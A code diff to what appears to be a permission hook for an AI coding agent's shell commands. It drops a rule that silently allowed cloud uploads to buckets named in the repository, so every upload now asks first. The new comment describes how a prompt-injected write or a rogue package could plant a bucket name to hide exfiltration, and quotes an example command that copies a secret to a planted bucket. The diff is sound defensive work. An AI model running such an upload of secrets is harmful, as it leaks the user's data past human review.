@@ -343,11 +343,6 @@ def _bucket_uri(uri: str) -> str:
     return m.group(1) if m else uri
 
 
-def _bucket_name(uri: str) -> str:
-    """`s3://bucket/key` → `bucket` (what to search the project corpus for)."""
-    return _bucket_uri(uri).split("://", 1)[-1]
-
-
 def _cloud_upload_targets(cmd: str) -> list[str]:
     """Destination buckets/containers of a cloud-storage UPLOAD, or [] if the
     command isn't an upload. Upload = a local source precedes a cloud URI
@@ -715,19 +710,20 @@ def _classify_bash(tool_input: dict, root: Path) -> tuple[str, str]:
                 f"a network call to an unrecognized host ({unknown}) with shell substitution embedded"))
         return (ASK, _ask(f"a network upload to {', '.join(ext_hosts)} (a known/unverified destination)"))
 
-    # --- cloud-storage upload (aws s3 / gsutil / az blob) — provenance-tiered ---
-    # A bucket the repo already names (Terraform, CI config, source) is the routine
-    # deploy path → allow silently. An unrecognized bucket asks once (per bucket).
-    # No DENY tier: a mistyped or unknown bucket is a scope question, not an attack
-    # signature, and cloud CLIs are how enterprises ship artifacts.
+    # --- cloud-storage upload (aws s3 / gsutil / az blob) → always ASK once ---
+    # A cloud upload moves data off the machine. We deliberately do NOT treat "the
+    # bucket is named somewhere in your source" as a silent allow: source is
+    # forgeable — a rogue package's postinstall, or a prompt-injected Write, can
+    # plant a bucket name — so a "known bucket → allow" rule would be a silent
+    # exfil-laundering path (`aws s3 cp <secret> s3://planted-bucket`). Provenance
+    # can't safely buy silence for data egress, so there's no scan here at all;
+    # every cloud upload asks, deduped per bucket (dedup_key → `egress:<bucket>`)
+    # so a repeat deploy to the same bucket in one session prompts only once.
     cloud = _cloud_upload_targets(cmd)
     if cloud:
-        verdicts = [value_in_project_cached(_bucket_name(c), root) for c in cloud]
-        if all(v is True for v in verdicts):
-            return (ALLOW, "")
-        absent = ", ".join(c for c, v in zip(cloud, verdicts) if v is not True)
         return (ASK, _ask(
-            f"uploading to cloud storage not referenced in this codebase ({absent})"))
+            f"uploading to cloud storage ({', '.join(cloud)}) — data leaving the "
+            "machine; confirm the destination bucket"))
 
     # --- package install (lifecycle scripts run arbitrary code) ---
     if (_PKG_INSTALL_RE.search(cmd)
